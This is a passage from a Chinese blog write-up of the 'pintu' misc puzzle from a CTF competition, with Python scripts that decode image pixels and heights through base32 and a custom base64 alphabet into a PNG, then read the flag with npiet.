+<pre><code>JRFTC5SFG5SU4STVHBTTCR2SKVSE2NKVIUYFCS2MOVFUWMLLGVKWITKLJZSE2NKVMRFUWY3EJU3VKZCNGVKU2SKQMNXE2WCVMRGTKVKNMM2XMRKLGE2US5SEOFWTMRDRNZVTO5LNGZCGYWDVOVYUG5KYKVWTMRDRMRBG4ZDNGZJE4TLWIRYWITJVOVWTMUSOMRGXK4LONM2VK3JWIRWGITJVMRWTMUSVJV3FEVLEJU2XKZCCNZKWITJVJZSE2NKVNZVTOVLEJU2VCWDVGVKUKTLEOFWTMRDMMRGTKVKYOU3XIRJWKJKGITJVKVSGEODQNJ2UWWCLGB2WWTDCOU3EWQRQJRCXKWDFMRBDINLJGVXEUSRPMFEUW5TYOFFEEWCTORGVQSBRNNJHKS2HKRDXIVSSOVEXE5JWNJGWCWCLIJIXATBXNZVUYQRROVIVMMDNORFWKR2JOJFU2S2JGBLEKTKQOFGU4UKGJN2FEUCNKY2EQQKOKVFU2TJVLBXESS3NMQXVMNZZKY2UQTJPMVSU2S2RINUXKMLVKFCW64KLJMZXO2JVJNEGI6JQO5GDKVJWOQ3TAMSLJVFFU2SNGAYW4Y2YMFGWWUSINJ2WY53EGA4WYTJWHB4GSZ2LJI4WENDWJQ3TKTBTG5LE45DHJNSUULZVOBFFMMJSJN2U2NSRM4YTSOKWMEZEYN3BOQ4UKZLDNFGVQ4SNJNIUUOJXNZ3FC23OOJFXONLZKFETQMTOI43VGSKNKBKTCVSQINUWENCLGFDWCYTJJU2GISLHGR3TG4SRIMZUES2YNZDTAMDUJUYEKTJQGV4ES6JRNVFWGMCUJI3XKN2NKZ4E45CHGB2DGYTBKFMHS33XIVHGK6KFO4YTCQ2CGRZG4VSYIFIWE6DXINZEW4BTI5QUC2LSG5LESVTOIF2E4YKTGM3TIVCKMIYTE3KHJMXXIY3PI52EK3TVNFZEWYKNO5LGW2SCKZYEK5ZUNQZXKODXLBCW4MJRKZFVAZCLKM3DSYRYKBXE4NCIJJVTE4KFKZITA2KJMR3UWQRUMFUWENDWJJHFCNDNNNJFGMZXMEXXIYTBKBIU2ZJPJIXVCSKYOI2HU5DHKM3USRJZOFGS642OGFDVQU3JGAYUW2TXGRAUS5KEKBXE2222JRTTG4BRIU2TMOKNGJ3UCTRVIZVESWCNNZRUWVSLJU2EM5COJM3VC5ZRMRXDA3ZXNFCTKWCKJZIWMMLDGREWUQTPJZUXSMBXNFTVQSCLIIZVI2TCNRIEK22LGZEWEUTMJU2WCZJZJV4FU2SJMVDFQVRXGFFGWUBYJJZG46CYGUYHSWBPGU4EWYRQJFVGEMLLNVVTS4KNOQ4DKSSHLAYDGRJVNBFUSNKFNZHDI2CFOU3U2M2NMFWUGSKSMFMGWN2WGM3TAOBTF42EEZDCHFWFQTLMOAZU
+</code></pre>
+<p>再将图片的颜色的黑白 转化为0和1</p>
+<pre><code class="python">from PIL import Image
+import os
+
+color = &quot;&quot;
+a = []
+for i in range(1,4704):
+    img = Image.open(&quot;./&#123;&#125;.png&quot;.format(i))
+    width,height=img.size
+    tmp = img.getpixel((0,0))
+    if (tmp == (0,0,0)):
+        color += &quot;0&quot;
+    elif(tmp == (255,255,255)):
+        color += &quot;1&quot;
+    a.append(chr(int(str(height), 8 )))
+
+print(color)
+</code></pre>
+<p>在转字符串</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152052620.png" alt="image-20231015205246528"></p>
+<p>得到换表</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152053953.png" alt="image-20231015205336865"></p>
+<p>保存为图片</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152054963.png" alt="image-20231015205412875"></p>
+<p>但是少文件尾 </p>
+<p>用脚本进行上述步骤 就可以补全文件尾</p>
+<pre><code class="python">from PIL import Image
+from libnum import n2s
+from base64 import b32decode, b64decode
+import os
+
+bin_data = &#39;&#39;
+dec_data = &#39;&#39;
+image_directory = &#39;./pintu/&#39;
+for i in range(1, 4704):
+    image_path = os.path.join(image_directory, f&#39;&#123;i&#125;.png&#39;)
+    if os.path.exists(image_path):
+        # Open the image and extract data
+        with Image.open(image_path) as image:
+            pixel = image.getpixel((0, 0))
+            dec_data += chr(int(str(image.height), 8))
+            bin_data += &#39;1&#39; if pixel == (255, 255, 255) else &#39;0&#39;
+bin_data = bin_data.ljust(((len(bin_data) + 7) // 8) * 8, &#39;0&#39;)
+
+new_b64 = &#39;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&#39;
+old_b64 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;
+data = &#39;&#39;
+for dec in dec_data.split(&#39; &#39;):
+    data += chr(int(dec, 10))
+data = b32decode(data).decode()
+trans = &#39;&#39;.maketrans(new_b64, old_b64)
+b64png = b64decode(data.translate(trans)).decode().split(&#39; &#39;)[0]
+png_data = b64decode(b64png)
+
+with open(&#39;./flag.png&#39;, &#39;wb&#39;) as f:
+    f.write(png_data)
+</code></pre>
+<p>一眼抽象画npiet解密</p>
+<pre><code>.\npiet.exe -tpic E:\Desktop\pintu\flag.png
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310161002747.png" alt="image-20231016100212654"></p>
+<p>得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/baecc4bd.html">http://w3nx1z1.github.io/posts/baecc4bd.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4246aef2.html" title="2023龙信杯取证复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023龙信杯取证复现</div></div></a></div><div class="next-post pull-right"><a href="/posts/96c5cf9c.html" title="2023蓝帽杯初赛取证wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023蓝帽杯初赛取证wp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF"><span class="toc-text">香山杯 喵帕斯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#list"><span class="toc-text">list</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-unserialize-pro"><span class="toc-text">PHP_unserialize_pro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Move"><span class="toc-text">Move</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E4%BB%8E%E5%93%AA%E5%84%BF%E6%9D%A5"><span class="toc-text">URL从哪儿来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pintu"><span class="toc-text">pintu</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd.html" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc.html" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9.html" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b3dd75d.html" title="DASCTF 2024最后一战 | Misc">DASCTF 2024最后一战 | Misc</a><time datetime="2025-01-08T10:00:09.647Z" title="发表于 2025-01-08 18:00:09">2025-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/90927854.html" title="w3nx1z1的2024年度个人总结">w3nx1z1的2024年度个人总结</a><time datetime="2024-12-31T12:34:30.170Z" title="发表于 2024-12-31 20:34:30">2024-12-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
